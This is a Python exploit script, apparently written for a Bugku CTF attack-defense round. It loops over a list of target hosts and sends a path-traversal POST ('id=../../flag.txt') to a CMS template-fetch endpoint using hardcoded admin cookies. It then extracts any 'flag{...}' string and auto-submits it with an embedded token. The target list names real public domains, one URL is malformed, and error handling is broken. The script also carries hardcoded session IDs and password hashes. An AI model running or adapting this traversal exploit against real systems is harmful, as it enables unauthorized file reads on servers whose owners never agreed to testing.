import requests

header = {
         "Content-Type": "application/x-www-form-urlencoded"
     }

ip = ["https://www.yuque.com", "https:/www.baidu.com", "https://base64.us/"]

cookie = {
        'login_username': 'admin',
        "login_password": "f04a49519b49a50c65d85de2055741af",
        "PHPSESSID": "n2u3i7d4ii2n26ofg3onm6f565"
    }
cookie2 = {
        'login_username': 'admin2',
        "login_password": "f04a49519b49a50c65d85de2055741af",
        "PHPSESSID": "n2u3i7d4ii2n26ofg3onm6f565"
    }

cookie3 = {
        'login_username': 'admin3',
        "login_password": "f04a49519b49a50c65d85de2055741af",
        "PHPSESSID": "n2u3i7d4ii2n26ofg3onm6f565"
    }
cookie_list = [cookie, cookie2, cookie3]

url = "/index.php?case=template&act=fetch&admin_dir=admin&site=default"
payload = "id=../../flag.txt"


def getflag():
    for i in range(0, len(ip)):
        print(ip[i] + url)
        #print(cookie_list[i])
        try:
            body = requests.post(ip[i] + url, headers=header, cookies=cookie_list[i], data=payload)
        except requests.exceptions.InvalidURL:
            print("请求异常: "+ip[i])
        if "flag" in body.text:
            print("[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+] 漏洞存在")
            flag = body.text
            demo = flag.find("flag{")  #flag开始的长度
            demo2 = len("flag{418f536a6a1e236a6a9fc4558f1239a5}") #获取flag的总长度
            print(flag[demo:demo+demo2])
            flags = flag[demo:demo+demo2]  #表示从开始到结束的长度

            http = "https://ctf.bugku.com/pvp/submit.html?token=b93ff054c907c318edd31ed8884d6909&flag={0}".format(flags)
            body = requests.get(http)
            if "正确" in body.text:
                print("提交成功")
            else:
                print("提交失败")
        else:
            print("[-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-] 利用失败")

if __name__ == '__main__':
    getflag()